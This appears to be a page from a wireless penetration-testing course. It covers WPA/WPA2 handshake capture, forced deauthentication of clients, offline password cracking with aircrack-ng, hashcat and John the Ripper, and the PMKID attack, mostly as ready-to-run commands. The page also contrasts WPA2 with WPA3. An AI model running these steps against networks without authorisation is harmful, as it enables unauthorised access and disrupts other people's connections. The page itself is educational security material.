# WPA/WPA2 Testing

## Unit 7 - Topic 2 | Wireless Network Testing

---

## Overview

**WPA/WPA2** are the most common wireless security protocols. WPA2-PSK networks can be attacked by capturing the 4-way handshake and cracking it offline. WPA2-Enterprise networks require different techniques like evil twin attacks.

---

## 1. WPA2 4-Way Handshake

```
WPA2-PSK AUTHENTICATION (4-Way Handshake):

CLIENT (STA)                    ACCESS POINT (AP)
     │                               │
     │  1. ANonce                     │
     │ ←─────────────────────────────│
     │  AP sends random number        │
     │                               │
     │  2. SNonce + MIC              │
     │ ─────────────────────────────→│
     │  Client computes PTK,         │
     │  sends its nonce + proof      │
     │                               │
     │  3. GTK + MIC                 │
     │ ←─────────────────────────────│
     │  AP confirms, sends group key │
     │                               │
     │  4. ACK                       │
     │ ─────────────────────────────→│
     │  Client confirms              │
     │                               │

PTK DERIVATION:
PTK = PRF(PMK + ANonce + SNonce + AP_MAC + STA_MAC)
PMK = PBKDF2(Passphrase, SSID, 4096 iterations, 256 bits)

TO CRACK: Capture handshake → try passwords → compute PMK → verify
```

---

## 2. Capture the Handshake

```bash
# === STEP 1: Start Monitor Mode ===
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# === STEP 2: Scan for Target Network ===
sudo airodump-ng wlan0mon
# Note: BSSID, Channel, ESSID

# === STEP 3: Capture on Target Channel ===
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture
# -c 6: Channel 6
# --bssid: Target AP MAC
# -w capture: Output file prefix

# === STEP 4: Force Handshake (Deauth Client) ===
# In a NEW terminal:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Deauths all clients → they reconnect → handshake captured!

# Target specific client:
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 wlan0mon

# === STEP 5: Verify Capture ===
# airodump-ng shows: "WPA handshake: AA:BB:CC:DD:EE:FF" ✅
# File: capture-01.cap
```

---

## 3. Crack the Handshake

```bash
# === AIRCRACK-NG (CPU-Based) ===
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
# Straightforward dictionary attack

# === HASHCAT (GPU-Accelerated — Faster!) ===
# Convert cap to hashcat format:
# Method 1: hcxpcapngtool
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Method 2: cap2hccapx (older)
cap2hccapx capture-01.cap hash.hccapx

# Crack with Hashcat:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000: WPA-PBKDF2-PMKID+EAPOL

# With rules:
hashcat -m 22000 hash.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Mask attack (known pattern):
hashcat -m 22000 hash.hc22000 -a 3 "?d?d?d?d?d?d?d?d"
# 8-digit numeric password

# === JOHN THE RIPPER ===
# Convert:
wpaclean clean.cap capture-01.cap
aircrack-ng clean.cap -J hash
# Crack:
john --wordlist=rockyou.txt hash.hccap
```

---

## 4. PMKID Attack (No Handshake Needed!)

```bash
# === PMKID ATTACK (Faster Alternative) ===
# No client needed — attack AP directly!
# Works on many WPA2 routers

# Capture PMKID:
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2 \
  --enable_status=1

# Convert:
hcxpcapngtool -o pmkid_hash.hc22000 pmkid.pcapng

# Crack:
hashcat -m 22000 pmkid_hash.hc22000 rockyou.txt

# HOW PMKID WORKS:
# ├── Request association with AP
# ├── AP includes PMKID in first message
# ├── PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
# ├── Can be cracked offline like handshake
# └── No need to wait for client or deauth anyone!
```

---

## 5. WPA3 and Modern Security

| Feature | WPA2 | WPA3 |
|---------|:----:|:----:|
| **Key exchange** | PSK (4-way) | SAE (Dragonfly) |
| **Offline cracking** | ✅ Possible | ❌ Prevented |
| **Forward secrecy** | ❌ No | ✅ Yes |
| **Dictionary attack** | ✅ Vulnerable | ❌ Resistant |
| **PMKID attack** | ✅ Vulnerable | ❌ Fixed |
| **Adoption** | Widespread | Growing |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **4-way handshake** | Captured for offline cracking |
| **Deauth** | Force client reconnect to capture handshake |
| **aircrack-ng** | CPU-based WPA cracking |
| **Hashcat -m 22000** | GPU-accelerated WPA cracking |
| **PMKID** | Attack AP directly — no client needed |
| **WPA3** | SAE prevents offline dictionary attacks |

---

## Quick Revision Questions

1. **What is the WPA2 4-way handshake?**
2. **Why do you deauthenticate clients during WPA testing?**
3. **What is the advantage of PMKID over handshake capture?**
4. **How does WPA3 SAE prevent offline cracking?**
5. **What Hashcat mode is used for WPA2 cracking?**

---

[← Previous: Wireless Reconnaissance](01-wireless-reconnaissance.md) | [Next: Evil Twin Attacks →](03-evil-twin-attacks.md)

---

*Unit 7 - Topic 2 of 6 | [Back to README](../README.md)*
